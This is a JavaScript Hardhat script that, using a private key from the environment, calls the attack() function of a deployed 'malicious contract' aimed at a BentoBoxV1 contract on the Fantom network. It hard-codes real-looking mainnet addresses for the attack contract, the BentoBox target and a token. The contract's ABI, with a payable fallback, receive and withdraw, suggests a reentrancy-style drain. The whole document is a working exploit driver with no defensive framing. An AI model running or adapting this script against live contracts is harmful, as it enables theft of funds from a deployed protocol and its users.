require('dotenv').config();
const { ethers } = require("hardhat");

async function main() {
    // Define your private key and contract ABI
    const privateKey = process.env.PRIVATE_KEY; // Ensure this is defined in your .env file
    const abi = [
        {
            "inputs": [{ "internalType": "address payable", "name": "_target", "type": "address" }],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "stateMutability": "payable",
            "type": "fallback"
        },
        {
            "inputs": [{ "internalType": "uint256", "name": "_amount", "type": "uint256" }],
            "name": "attack",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "owner",
            "outputs": [{ "internalType": "address payable", "name": "", "type": "address" }],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "target",
            "outputs": [{ "internalType": "contract BentoBoxV1", "name": "", "type": "address" }],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "stateMutability": "payable",
            "type": "receive"
        }
    ];
    
   

    const provider = new ethers.providers.JsonRpcProvider("https://fantom.drpc.org");
    const wallet = new ethers.Wallet(privateKey, provider);

    console.log("Attacking with the account:", wallet.address);

    const maliciousContractAddress = "0x389A9c4E9075972843B816C4f05F5E47ED74f471"; // Malicious Contract Address
    const targetBentoBoxAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454"; // BentoBox Contract Address
    const tokenAddress = "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83"; // WETH Token Address

    if (!maliciousContractAddress || !targetBentoBoxAddress || !tokenAddress) {
        console.error("Error: MALICIOUS_CONTRACT_ADDRESS, BENTOBOX_ADDRESS, or TOKEN_ADDRESS not defined.");
        process.exit(1);
    }

    // Connect to the MaliciousContract using the provider and wallet
    const MaliciousContract = new ethers.Contract(maliciousContractAddress, abi, wallet);
    const attackAmount = ethers.utils.parseEther("1.0"); // Example: attacking with 1 ether

    try {
        const tx = await MaliciousContract.attack(attackAmount, {
            from: wallet.address,      // Specify the wallet's address
            value: attackAmount,       // Amount of Ether to send
            gasLimit: 5000000          // Specify a gas limit
        });

        console.log(tx);
        await tx.wait();
        console.log("Attack executed successfully. Transaction Hash:", tx.hash);
    } catch (error) {
        console.error("Error executing attack:", error);
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("Error running the script:", error);
        process.exit(1);
    });
